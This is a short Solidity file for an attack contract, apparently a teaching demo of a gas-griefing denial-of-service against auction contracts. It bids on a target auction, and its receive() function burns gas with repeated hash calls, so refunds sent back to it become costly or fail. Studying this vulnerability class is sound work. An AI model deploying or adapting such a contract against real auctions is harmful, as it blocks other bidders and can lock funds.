// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;
 
interface IAuction {
    function bid() external payable;
}

contract GCA {

    function attack(address _auction) external payable {
        IAuction(_auction).bid{value: msg.value}();
    }

    receive() external payable{
        keccak256("Just wasting some gas...");
        keccak256("Just wasting some gas...");
        keccak256("Just wasting some gas...");
        keccak256("Just wasting some gas...");
        keccak256("Just wasting some gas...");

        //etc...

    }
}